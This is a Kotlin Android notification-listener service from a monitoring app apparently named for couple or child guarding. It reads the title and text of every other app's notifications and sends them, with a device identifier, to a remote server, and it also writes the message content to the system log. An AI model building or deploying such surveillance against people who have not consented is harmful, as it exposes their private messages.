package com.example.couple_guard_child.services.background

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import io.flutter.plugin.common.MethodChannel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import android.content.SharedPreferences
import android.content.Context
import android.os.Handler
import android.os.Looper

class MyNotificationListenerService : NotificationListenerService() {

    companion object {
        private const val TAG = "NotifListener"
        private const val API_URL = "https://parentalcontrol.satelliteorbit.cloud/api/device/notifications"
        
        var methodChannel: MethodChannel? = null
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
        
    private val scope = CoroutineScope(Dispatchers.IO)
    private val mainHandler = Handler(Looper.getMainLooper())
    
    // Cache device ID untuk performa
    private var cachedDeviceId: String? = null
    
    private fun getDeviceId(): String? {
        // Return cached jika sudah ada
        if (cachedDeviceId != null && cachedDeviceId!!.isNotEmpty()) {
            return cachedDeviceId
        }
        
        return try {
            val prefs: SharedPreferences = applicationContext.getSharedPreferences(
                "FlutterSharedPreferences", 
                Context.MODE_PRIVATE
            )
            
            // PENTING: Gunakan key yang sama dengan Flutter (flutter.device_id)
            cachedDeviceId = prefs.getString("flutter.device_id", null)
            
            if (cachedDeviceId.isNullOrEmpty()) {
                Log.e(TAG, "❌ Device ID NOT FOUND in SharedPreferences!")
                Log.e(TAG, "Available keys: ${prefs.all.keys}")
                
                // Coba ambil dari device info sebagai fallback
                cachedDeviceId = android.provider.Settings.Secure.getString(
                    applicationContext.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                )
                
                if (!cachedDeviceId.isNullOrEmpty()) {
                    // Save ke SharedPreferences untuk next time
                    prefs.edit().putString("flutter.device_id", cachedDeviceId).apply()
                    prefs.edit().putBoolean("flutter.is_paired", true).apply()
                    Log.e(TAG, "✅ Device ID generated from Android ID: $cachedDeviceId")
                }
            } else {
                Log.e(TAG, "✅ Device ID retrieved from SharedPreferences: $cachedDeviceId")
            }
            
            cachedDeviceId
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error getting device ID", e)
            null
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.e(TAG, "========================================")
        Log.e(TAG, "SERVICE CREATED")
        
        // Pre-load device ID saat service dibuat
        val deviceId = getDeviceId()
        Log.e(TAG, "Device ID: $deviceId")
        Log.e(TAG, "Device ID is ${if (deviceId.isNullOrEmpty()) "EMPTY/NULL" else "OK"}")
        Log.e(TAG, "MethodChannel: ${methodChannel != null}")
        Log.e(TAG, "========================================")
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.e(TAG, "========================================")
        Log.e(TAG, "LISTENER CONNECTED")
        
        val deviceId = getDeviceId()
        Log.e(TAG, "Device ID on connect: $deviceId")
        
        if (deviceId.isNullOrEmpty()) {
            Log.e(TAG, "⚠️ WARNING: Device ID is NULL/EMPTY - notifications will NOT be sent!")
        }
        
        Log.e(TAG, "========================================")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.e(TAG, "LISTENER DISCONNECTED")
        // Clear cache
        cachedDeviceId = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        Log.e(TAG, "----------------------------------------")
        Log.e(TAG, "NEW NOTIFICATION RECEIVED")
        
        try {
            val packageName = sbn.packageName
            Log.e(TAG, "Package: $packageName")
            
            // Skip own notifications
            if (packageName == applicationContext.packageName) {
                Log.e(TAG, "Skipping own notification")
                return
            }
            
            val notification = sbn.notification
            val extras = notification.extras

            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            val timestamp = sbn.postTime

            Log.e(TAG, "Title: $title")
            Log.e(TAG, "Text: $text")
            Log.e(TAG, "Timestamp: $timestamp")

            // IMPORTANT: Send to server FIRST (more reliable)
            sendToServer(packageName, title, text)
            
            // Then try to send to Flutter (optional, may fail if app is closed)
            sendToFlutter(packageName, title, text, timestamp)

        } catch (e: Exception) {
            Log.e(TAG, "ERROR processing notification: ${e.message}", e)
        }
        
        Log.e(TAG, "----------------------------------------")
    }

    private fun sendToFlutter(
        packageName: String,
        title: String,
        text: String,
        timestamp: Long
    ) {
        try {
            if (methodChannel == null) {
                Log.e(TAG, "MethodChannel is NULL - skipping Flutter notification")
                return
            }
            
            // Post to main thread for MethodChannel
            mainHandler.post {
                try {
                    Log.e(TAG, "Invoking Flutter method...")
                    
                    methodChannel?.invokeMethod(
                        "onNotificationReceived",
                        mapOf(
                            "package" to packageName,
                            "title" to title,
                            "text" to text,
                            "timestamp" to timestamp.toString()
                        )
                    )
                    
                    Log.e(TAG, "Flutter method invoked successfully")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to invoke Flutter method", e)
                }
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send to Flutter", e)
        }
    }

    private fun sendToServer(appName: String, title: String, content: String) {
        // Launch in coroutine for async execution
        scope.launch {
            try {
                Log.e(TAG, "=== SENDING TO SERVER ===")
                
                val deviceId = getDeviceId()
                if (deviceId.isNullOrEmpty()) {
                    Log.e(TAG, "❌ CRITICAL ERROR: Device ID is NULL or EMPTY")
                    Log.e(TAG, "❌ Cannot send notification without Device ID")
                    return@launch
                }
                
                Log.e(TAG, "✅ Device ID: $deviceId")
                Log.e(TAG, "App Name: $appName")
                Log.e(TAG, "Title: $title")
                Log.e(TAG, "Content: $content")
                
                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("app_name", appName)
                    put("title", title)
                    put("content", content)
                }

                val jsonString = json.toString()
                Log.e(TAG, "JSON Payload: $jsonString")
                
                val body = jsonString.toRequestBody("application/json".toMediaType())

                val request = Request.Builder()
                    .url(API_URL)
                    .post(body)
                    .addHeader("Content-Type", "application/json")
                    .addHeader("Accept", "application/json")
                    .build()

                Log.e(TAG, "Executing HTTP request to: $API_URL")
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                
                Log.e(TAG, "=== SERVER RESPONSE ===")
                Log.e(TAG, "Status Code: ${response.code}")
                Log.e(TAG, "Response Body: $responseBody")
                
                if (response.isSuccessful) {
                    Log.e(TAG, "✅ SUCCESS: Notification sent to server")
                } else {
                    Log.e(TAG, "❌ FAILED: ${response.code} - $responseBody")
                }
                
                response.close()
                
            } catch (e: Exception) {
                Log.e(TAG, "❌ EXCEPTION sending to server", e)
                Log.e(TAG, "Exception details: ${e.javaClass.name}: ${e.message}")
                e.printStackTrace()
            }
        }
    }
}